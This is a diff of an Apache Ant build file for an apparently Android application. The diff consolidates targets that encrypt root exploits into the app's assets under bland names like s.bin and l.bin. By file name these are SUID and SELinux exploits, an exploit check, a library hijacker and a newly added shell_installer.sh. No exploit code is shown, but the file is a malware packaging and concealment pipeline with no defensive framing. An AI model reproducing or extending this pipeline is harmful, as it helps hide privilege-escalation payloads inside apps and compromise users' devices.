@@ -91,8 +91,8 @@
 	</target>
 
 	<target name="init_enc">
-		<delete dir="enc"/>
-		<mkdir dir="enc"/>
+		<delete dir="enc" />
+		<mkdir dir="enc" />
 	</target>
 
 	<target name="encrypt-messages" depends="salt,init_enc">
@@ -103,57 +103,43 @@
 		</stringencrypt>
 	</target>
 
-	<target name="encrypt-suid">
+	<target name="encrypt-exploit">
 		<delete file="assets/s.bin" />
 		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/suidext" outputFile="assets/s.bin" />
-	</target>
-
-	<target name="encrypt-selinuxsuid">
 		<delete file="assets/j.bin" />
 		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/selinux_suidext" outputFile="assets/j.bin" />
-	</target>
-
-	<target name="encrypt-exploitcheck">
 		<delete file="assets/h.bin" />
 		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/expl_check" outputFile="assets/h.bin" />
-	</target>
-
-	<target name="encrypt-selinuxexploitcheck">
 		<delete file="assets/d.bin" />
 		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/selinux_check" outputFile="assets/d.bin" />
-	</target>
-
-	<target name="encrypt-localexploit">
 		<delete file="assets/l.bin" />
 		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/local_exploit" outputFile="assets/l.bin" />
-	</target>
-
-	<target name="encrypt-selinuxexploit">
 		<delete file="assets/g.bin" />
 		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/selinux_exploit" outputFile="assets/g.bin" />
+		<delete file="assets/k.bin" />
+		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/shell_installer.sh" outputFile="assets/k.bin" />
 	</target>
 
 	<target name="encrypt-hijacklibrary">
 		<delete file="assets/i.bin" />
 		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/libt.so" outputFile="assets/i.bin" />
+		<delete file="assets/m.bin" />
+		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/hijack" outputFile="assets/m.bin" />
+
 	</target>
-	
+
 	<target name="encrypt-hijacklibrary-debug">
 		<delete file="assets/i.bin" />
 		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/libt_debug.so" outputFile="assets/i.bin" />
-	</target>
-
-	<target name="encrypt-hijacker">
 		<delete file="assets/m.bin" />
 		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/hijack" outputFile="assets/m.bin" />
 	</target>
 
-	<target name="libs" depends="encrypt-suid, encrypt-selinuxsuid, encrypt-exploitcheck, encrypt-localexploit, encrypt-selinuxexploitcheck, 
-	    encrypt-hijacklibrary, encrypt-hijacker, encrypt-selinuxexploit">
+
+	<target name="libs" depends="encrypt-exploit, encrypt-hijacklibrary">
 	</target>
 
-	<target name="libs-debug" depends="encrypt-suid, encrypt-selinuxsuid, encrypt-exploitcheck, encrypt-localexploit, encrypt-selinuxexploitcheck, 
-	    encrypt-hijacklibrary, encrypt-hijacker, encrypt-selinuxexploit">
+	<target name="libs-debug" depends="encrypt-exploit,  encrypt-hijacklibrary">
 	</target>
 
 	<target name="init" depends="salt" unless="build.number">
@@ -263,10 +249,10 @@
 				</case>
 				<default>
 					<echo message="call libs" />
-					<antcall target="libs"/>
+					<antcall target="libs" />
 				</default>
 			</switch>
-				
+
 
 		</sequential>
 	</macrodef>
@@ -350,7 +336,7 @@
 	<target name="set-debug-default" depends="init">
 		<set-cfg kind="debug" osversion="default">
 		</set-cfg>
-		
+
 		<delete dir="enc" />
 	</target>
 
@@ -445,7 +431,7 @@
 
 				<echo message="bin/@{osversion}/${kind}/core.android" />
 				<set-cfg osversion="@{osversion}" kind="${kind}" />
-				
+
 				<antcall target="encrypt-messages" />
 
 				<echo>call release</echo>
